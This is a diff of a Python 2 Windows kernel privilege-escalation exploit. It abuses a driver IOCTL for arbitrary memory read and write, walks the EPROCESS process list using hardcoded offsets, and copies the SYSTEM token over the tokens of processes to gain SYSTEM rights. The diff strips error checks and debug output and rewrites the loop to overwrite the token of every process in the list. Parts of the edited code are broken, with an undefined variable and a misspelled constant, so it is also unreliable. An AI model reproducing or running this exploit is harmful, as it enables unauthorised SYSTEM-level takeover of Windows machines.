@@ -193,9 +193,9 @@ def writePrimitive(driver, what_addr, where):
     #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             #long(what_addr), data, len(data), byref(written))
 
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory', 'e')
-        sys.exit()
+    #if dwStatus == 0:
+        #print ('Something went wrong while writing to memory', 'e')
+        #sys.exit()
 
     data = struct.pack('<Q', long(what_addr)) + struct.pack('<Q', long(where))
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
@@ -241,15 +241,15 @@ def readPrimitive(driver, what_addr, where):
     lpBytesReturned = byref(dwBytesReturned)
 
                                                             # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
-    print "WHAT: ", type(what_addr), hex(what_addr)
-    print "WHERE: ", type(where), hex(where)
+    
+    #print "WHAT: ", type(what_addr), hex(what_addr)
+    #print "WHERE: ", type(where), hex(where)
 
     data = struct.pack('<QQ', what_addr, where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             user_addr, data, len(data), byref(written))
 
-    print 'Value before DeviceIoControl: %08x' % cast(user_addr,
-            POINTER(c_ulonglong))[0]
+    #print 'Value before DeviceIoControl: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
 
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -262,57 +262,60 @@ def readPrimitive(driver, what_addr, where):
         NULL,
         )
 
-    print 'Value after: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
+    #print 'Value after: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
  
     read_value = cast(user_addr, POINTER(c_ulonglong))[0]
-    print type(read_value)
-    print ("Read_value is: " + hex(read_value))
+    #print type(read_value)
+    #print ("Read_value is: " + hex(read_value))
 
     #return (triggerIOCTL, read_value)
     return read_value
-
 
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
 def get_current_eprocess(system_process_base_pointer, driver):
     """ Returns ptr to Current EPROCESS structure """
-    unique_process_id_offset = 0x2e0
-    active_process_links_offset = 0x2e8
-    token_offset = 0x358
+    PID_OFFSET = 0x2e0
+    PROC_FLINK_OFFSET = 0x2e8
+    TOKEN_OFFSE = 0x358
 
-    flink = readPrimitive(driver, system_process_base_pointer + active_process_links_offset, user_addr)
+    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, user_addr)
     print hex(flink)
+    #stop = flink
     currentprocessBase = 0
-    while True:
-        unique_process_id = c_ulonglong(0)
+
+        #unique_process_id = c_ulonglong(0)
 
         # Adjust EPROCESS pointer for next entry
 
         #print("Flink.value {}".format(flink.value))
-        #system_process_base_pointer = flink.value - unique_process_id_offset - 0x8
-        system_process_base_pointer = flink - unique_process_id_offset - 0x8
+        #system_process_base_pointer = flink.value - PID_OFFSET - 0x8
+    system_process_base_pointer = flink - PID_OFFSET - 0x8
 
-        print type(system_process_base_pointer), hex(system_process_base_pointer)
+    print "System Process Base Pointer", type(system_process_base_pointer), hex(system_process_base_pointer)
         # Get PID
 
-        unique_process_id = readPrimitive(driver, system_process_base_pointer + unique_process_id_offset, user_addr)
+    #unique_process_id = readPrimitive(driver, system_process_base_pointer + PID_OFFSET, user_addr)
+    print "Process ID: ", unique_process_id
 
-        
+    print c_ulonglong(unique_process_id).value
         # Check if we're in the current process
 
-        if os.getpid() == unique_process_id.value:
-            currentprocessBase = system_process_base_pointer
-            break
+        #if os.getpid() == unique_process_id:
+            #print "Our Process ID is: ", os.getpid()
+            #currentprocessBase = system_process_base_pointer
+            #break
 
-        flink = readPrimitive(driver, system_process_base_pointer
-                      + active_process_links_offset, user_addr)
+    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, user_addr)
 
+    print "Flink ", hex(flink)
+        
         # If next same as last, we've reached the end
 
-        #base_pointer = flink.value - unique_process_id_offset - 0x8
-        base_pointer = flink - unique_process_id_offset - 0x8
-        if base_pointer == system_process_base_pointer:
-            break
+        #base_pointer = flink.value - PID_OFFSET - 0x8
+    base_pointer = flink - PID_OFFSET - 0x8
+    #if base_pointer == system_process_base_pointer:
+            #break
 
     return long(currentprocessBase)
 
@@ -361,24 +364,34 @@ def executeOverwrite():
 
         read_value = readPrimitive(driver, system_process_base_pointer, user_addr)
 
-        # Walk the process list for wherever our process is in memory.
-
-        print "MAIN Got System Token, Getting Current Process Base!"
-        currentprocessBase = get_current_eprocess(system_process_base_pointer, driver)
-
+        
         # Define our expected offsets for this version of Windows.
 
+
+        PROC_FLINK_OFFSET = 0x2e8
+        TOKEN_OFFSET = 0x358
+
         print "MAIN We know the proper offsets now."
-        system_token = system_process_base_pointer + 0x358
-        current_token = currentprocessBase + 0x358
+        system_token = system_process_base_pointer + TOKEN_OFFSET
+        
+        process_base_pointer = system_process_base_pointer
 
-        print(system_token)
-        print(current_token)
+        while True:
 
-        # Write the system_token over our current_token for SYSTEM privileges.
+            flink = readPrimitive(driver, process_base_pointer + PROC_FLINK_OFFSET, user_addr)
+            if flink == system_process_base_pointer:
+                break
+     
+            process_base_pointer = flink
 
-        print "MAIN Attempting system to current token overwrite!"
-        success = writePrimitive(driver, system_token, current_token)
+            print "Process Base Pointer", type(process_base_pointer), hex(process_base_pointer)
+
+            current_token = process_base_pointer + TOKEN_OFFSET
+
+            # Write the system_token over our current_token for SYSTEM privileges.
+            print "MAIN Attempting system to current token overwrite!"
+
+            success = writePrimitive(driver, system_token, current_token)
 
         print "MAIN Success!"
 ############################################ RUN ################################################
